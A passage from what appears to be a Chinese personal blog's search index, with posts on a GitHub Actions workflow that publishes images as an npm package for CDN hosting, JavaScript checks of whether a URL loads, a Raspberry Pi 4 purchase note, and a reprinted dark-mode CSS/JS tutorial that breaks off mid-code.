安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 12:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"树莓派 4 揽件日志","date":"2021-03-19 11:16:00","description":"\n<p>前两天在淘宝上购买了一台 4GB 版本的 树莓派 4 。</p>\n<p>在安装系统时我选择了 <code>Ubuntu Server</code> 系统，因为我并不打算使用图形化界面，而且 Raspbian 系统只有 32 位的 ╮(╯▽╰)╭。</p>\n<p>而商家发的是中通快递，速度慢不说，外包装都给我压烂了。(ó﹏ò｡)</p>\n<p>商家随主板还发货了一个闪迪 32GB TF 卡（读写速度还可以），一个电源，一个外壳还有一个小风扇。</p>\n<p>目前先折腾折腾，玩一玩，后面继续写文章。</p>\n<p>目前没有把网站迁移上去的想法，因为这样的话网站会变得很不稳定。</p>\n","link":"https://blog.yfun.top/posts/229627020/"},{"title":"为网站加入友好的深色模式支持","date":"2021-01-22 04:29:38","description":"\n<div class=\"note note-info\">            <div class=\"title\">转载文章</div>原文标题：你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持<p>原文链接：<a href=\"https://blog.skk.moe/post/hello-darkmode-my-old-friend/\">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a><br>原文作者：Sukka</p>          </div>\n<p>前几天为我的 Hexo 主题：Miracle 加入了深色模式，但我的技术还是太辣鸡，经常出现问题。</p>\n<p>无意间看到 Sukka 大佬的文章：「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」，跟着文章重构了主题深色模式的代码，就转载过来方便学习。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%80%E4%B9%88%E6%98%AF%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"什么是「深色模式」\"></a>什么是「深色模式」</h2>\n<p>很多操作系统在日落后会自动切换到「深色模式」、并不意味着「深色模式」就是「夜间模式」。「夜间模式」用于夜晚的弱光环境，主要目的是保护眼睛、减少强光刺激、避免影响睡眠，不难理解为什么 macOS 的 Night Shift 会自动调节屏幕色温、Android（AOSP）到了夜间可以选择启用系统级「琥珀色」滤镜。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/macos-settings.png\"><p>「深色模式」更像是一个主题，即使在白天也可以使用。不论是为了在 OLED 屏幕上省电、亦或是减少白光刺激护眼、亦或是暗色模式对色盲用户更加友好，总之 macOS 率先提出了系统级的「暗色模式」、并在 WebKit 中增加了对应的 Media Query，而后 Chromium、Firefox 先后跟进，如今兼容 <code>prefers-color-scheme</code> 的浏览器占有率已经高达 81.82%。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%88%A9%E7%94%A8-Media-Query-%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"利用 Media Query 简单实现深色模式\"></a>利用 Media Query 简单实现深色模式</h2>\n<p>CSS 媒体查询 <code>@media</code> 是一个足够强大的特性，可以有条件地将样式应用于文档和各种上下文中。<a href=\"https://drafts.csswg.org/mediaqueries-5/\">Media Queries Level 5 草案</a> 中提出了深色模式的判断方式 <code>prefers-color-scheme</code>，包含 <code>light</code>、<code>dark</code>、<code>no-preference</code> 三种值。而不支持 Media Queries 5 的浏览器会直接无视 CSS 中的 <code>prefers-color-scheme</code> Media Query，无需额外的代码即可优雅降级。</p>\n<p>还记得我刚刚说过「深色模式更像一个主题」么？为网站新增深色模式就如同换肤功能；搭配 <code>prefers-color-scheme</code>，编写深色模式的思路就如同编写响应式一般、无需赘述，结合几段 Code Snippet 一笔带过：</p>\n<h3>\n<a href=\"https://blog.yfun.top/#CSS-Variable-%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"CSS Variable 的方法实现深色模式\"></a>CSS Variable 的方法实现深色模式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-text</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>通过维护两套 CSS Variable，可以快速切换不同的配色方案。这种方法特点是所需代码较少，缺点是 CSS Variable 的兼容性较差，可能还需要引入额外的 Polyfill。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%BA%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E5%8D%95%E7%8B%AC%E7%BC%96%E5%86%99%E6%A0%B7%E5%BC%8F\" class=\"headerlink\" title=\"为深色模式单独编写样式\"></a>为深色模式单独编写样式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>直接维护两套样式的方法清晰直观、任何网站都可以基于这种方法进行改造。但会造成冗余代码、较难实现统一的风格、后期不易维护。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%9D%A1%E4%BB%B6%E6%80%A7%E5%8A%A0%E8%BD%BD%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E7%9A%84-CSS-%E6%96%87%E4%BB%B6\" class=\"headerlink\" title=\"条件性加载深色模式的 CSS 文件\"></a>条件性加载深色模式的 CSS 文件</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* main.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* dark.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"main.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"dark.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"(prefers-color-scheme: dark)\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 <code>&lt;link&gt;</code> 标签的 Media Query，甚至可以单独加载暗色模式的 CSS 文件。</p>\n<blockquote><p>需要注意 CSS 选择器的权重，因此作为可选的 <code>dark.css</code> 一定要放在 <code>main.css</code> 之后加载。</p></blockquote>\n<p>除了上述三种方式以外，使用 CSS <code>filter</code> 或 <code>mix-blend-mode</code> 还可以实现对网站整体色调的改变，可以确保配色风格的统一性。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7\" class=\"headerlink\" title=\"「深色模式」的兼容性\"></a>「深色模式」的兼容性</h2>\n<p>虽然有了优雅的 <code>prefers-color-scheme</code> 可以识别操作系统的显示模式，但是对于用户来说，仅依赖 Media Query 的「深色模式」并不能带来很好的体验。<br>首先是浏览器兼容性。虽然支持该特性的浏览器的市场占有率非常喜人，但是从版本号上来看却并不乐观：</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/caniuse.png\"><p>考虑到使用 Chormium 70 内核甚至 Tencent X5 内核的国产浏览器，大部分用户并没有机会体验到深色模式。除此以外，操作系统级别的「深色模式」实现也会受到 OEM 厂商的影响 —— 虽然 Android 10（AOSP）提供「深色模式」，但是一加的 OxygenOS 却将其深藏在系统主题设置里，没有自动切换、在 Quick Settings 里也没有快速的切换开关。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%8F%8B%E5%A5%BD%E7%9A%84%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"设计一个用户友好的「深色模式」\"></a>设计一个用户友好的「深色模式」</h2>\n<p>受限于兼容性和复杂的操作系统，大部分网站依然在使用更传统的「开关」切换 —— 通过 toggle <code>&lt;html&gt;</code> 或<br><code>&lt;body&gt;</code> 的 class 属性实现在两套样式之间切换、并将开关的状态记忆在 localStorage 中的方法虽然有效，却是无奈之举，手动切换开关相比 <code>prefers-color-scheme</code> 也不够优雅。如果将「开关」和 <code>prefers-color-scheme</code> 结合起来，就可以带来更好的用户体验：</p>\n<ul>\n<li>对于不兼容的浏览器或操作系统，访客依然可以通过开关手动切换显示模式</li>\n<li>对于兼容的浏览器或操作系统，Media Query 能够实现在两种显示模式之间切换</li>\n<li>在兼容的浏览器或操作系统上，用户还可以通过开关 override 当前的显示模式</li>\n</ul>\n<p>在将两者组合在一起时，不能简单地用「开关」覆盖 <code>prefers-color-scheme</code>，否则用户触发开关、状态被永久记忆在 localStorage 之后，就变成了僵硬的手动模式。<br>举个例子。访客可能在操作系统还没有自动切换到「深色模式」时通过网站上的开关切换显示模式，经过一个夜晚后到了次日白天、访客再度访问网站时，自然希望不需要再切换开关、网站就能以常规的浅色模式显示。因此设计思路是当 <code>prefers-color-scheme</code> 的值发生改变（从 与用户需要的显示模式不同 变成 相同）时清空 localStorage 中储存的开关状态，此时显示模式切换回基于 Media Query 的「自动」模式。</p>\n<p><strong>Talk is cheap, here goes the code.</strong></p>\n<p>首先是 CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'dark'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span><span class=\"selector-pseudo\">:not(</span><span class=\"selector-attr\">[data-user-color-scheme]</span>) {</span><br><span class=\"line\">    <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-attr\">[data-user-color-scheme=<span class=\"string\">'dark'</span>]</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>真是令人看的头大，让我们逐行来看都是些什么：</p>\n<ul>\n<li>在 <code>:root</code> 下定义了一个 CSS Variable <code>--color-mode: light</code> 和在浅色模式下用到的 CSS Variable（比如使用深色 <code>#333</code> 作为主要字体颜色）。</li>\n<li>使用 <code>prefers-color-scheme</code> 的 Media Query 定义深色模式下的 CSS Variable： <code>--color-mode: light</code> 。深色模式的样式（如浅色 <code>#eff</code> 作为主要字体颜色）要定义在 <code>:not([data-user-color-scheme])</code> 伪类下以避免「开关」的行为覆盖浏览器的样式。</li>\n<li>为 <code>[data-user-color-scheme='dark']</code> 再定义一遍深色模式下用到的样式。<br>有了这段 CSS，不难理解深色模式何时会生效：当操作系统使用「深色模式」且 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 标签上没有 <code>data-user-color-scheme</code> 属性时、或者存在 <code>data-user-color-scheme</code> 属性且值为 <code>dark</code> 时。</li>\n</ul>\n<p>然后是困难的部分了：编写 JavaScript 为「开关」添加行为。</p>\n<p>先定义一些常量：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">// &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeStorageKey = <span class=\"string\">'user-color-scheme'</span>; <span class=\"comment\">// 作为 localStorage 的 key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeMediaQueryKey = <span class=\"string\">'--color-mode'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElementDarkModeAttributeName = <span class=\"string\">'data-user-color-scheme'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeTogglebuttonElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"comment\">/* element id */</span>);</span><br></pre></td></tr></table></figure><p>接下来，用 <code>try {} catch (e) {}</code> 封装一下 localStorage 的操作，以应对 HTML5 Storage 被禁用、localStorage 被写满、localStorage 实现不完整的情况：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> setLS = <span class=\"function\">(<span class=\"params\">k, v</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.setItem(k, v);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> removeLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.removeItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> getLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span 